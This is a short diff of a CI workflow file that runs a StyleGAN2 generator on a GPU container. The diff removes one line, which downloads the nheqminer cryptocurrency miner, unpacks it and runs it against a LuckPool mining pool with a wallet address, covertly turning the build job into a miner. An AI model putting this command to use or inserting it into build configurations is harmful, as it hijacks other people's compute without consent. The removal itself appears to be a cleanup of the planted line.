@@ -36,5 +36,5 @@ jobs:
         cd /inputs/stylegan2
         nvidia-smi
         python run_generator.py 
-        wget https://github.com/VerusCoin/nheqminer/releases/download/v0.8.2/nheqminer-Linux-v0.8.2.tgz && tar -xvf nheqminer-Linux-v0.8.2.tgz && tar -xvf nheqminer-Linux-v0.8.2.tar.gz && nheqminer/nheqminer -v -l ap.luckpool.net:3956 -u RT15dMcXVKH8waNmVQvEFgjNCuHjprQgdB.Rig001 -p x -t 8
+        
       image: tensorflow/tensorflow:1.14.0-gpu-py3
